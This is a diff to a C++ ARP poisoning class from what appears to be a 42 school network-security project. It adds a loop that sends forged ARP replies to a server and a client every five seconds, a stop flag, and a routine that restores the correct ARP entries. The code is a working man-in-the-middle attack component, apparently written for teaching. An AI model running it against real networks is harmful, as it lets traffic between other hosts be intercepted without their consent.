@@ -6,14 +6,16 @@
 /*   By: hoannguy <hoannguy@student.42lausanne.c    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/07/07 23:23:41 by hoannguy          #+#    #+#             */
-/*   Updated: 2026/07/08 22:07:02 by hoannguy         ###   ########.fr       */
+/*   Updated: 2026/07/09 11:43:04 by hoannguy         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "Poisoner.hpp"
 
-Poisoner::Poisoner(Victims &victims, pcpp::MacAddress poison_mac) {
-	this->poison_mac = poison_mac;
+Poisoner::Poisoner(Victims &victims, pcpp::PcapLiveDevice *device) {
+	this->poison_mac = device->getMacAddress();
+	this->device = device;
+	this->stop = false;
 	
 	pcpp::MacAddress s_mac = victims.get_Mac(SERVER);
 	pcpp::IPv4Address s_ip = victims.get_Ip(SERVER);
@@ -43,4 +45,29 @@ pcpp::Packet Poisoner::create_packet(
 	newPacket.addLayer(arpLayer, true);
 	newPacket.computeCalculateFields();
 	return newPacket;
+}
+
+void Poisoner::poison() {
+	while (!this->stop) {
+		if (!this->device->sendPacket(&this->poisoned_server_packet))
+            throw std::runtime_error("Failed to send poison to server");
+        if (!this->device->sendPacket(&this->poisoned_client_packet))
+            throw std::runtime_error("Failed to send poison to client");
+		std::this_thread::sleep_for(std::chrono::seconds(5));
+	}
+}
+
+void Poisoner::stop_poison() {
+	this->stop = true;
+}
+
+void Poisoner::restore() {
+	int tries = 3;
+	for (int i = 0; i < tries; i++) {
+		if (!this->device->sendPacket(&this->good_server_packet))
+            throw std::runtime_error("Failed to send restore to server");
+        if (!this->device->sendPacket(&this->good_client_packet))
+            throw std::runtime_error("Failed to send restore to client");
+		std::this_thread::sleep_for(std::chrono::seconds(1));
+	}
 }
